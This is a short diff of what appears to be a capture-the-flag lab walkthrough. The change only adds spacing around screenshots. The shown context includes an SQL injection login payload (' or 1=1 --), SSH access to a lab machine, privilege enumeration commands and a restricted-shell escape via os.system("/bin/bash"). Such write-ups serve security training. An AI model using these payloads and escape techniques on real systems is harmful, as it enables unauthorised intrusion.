@@ -130,21 +130,26 @@ Password: `' or 1=1 --`
 # Remote Access/SSH
 
     ssh robert@192.168.56.106
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788352355_image.png)
 
 
 Let the enumeration begin
 
     sudo -l
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788390459_image.png)
 
     uname -a
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788415595_image.png)
 
     which python
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788460435_image.png)
 
     cd /
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788497865_image.png)
 
 
@@ -153,6 +158,7 @@ Let the enumeration begin
 Escaping the restricted shell
 
     echo os.system("/bin/bash")
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788604365_image.png)
 
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788673208_image.png)
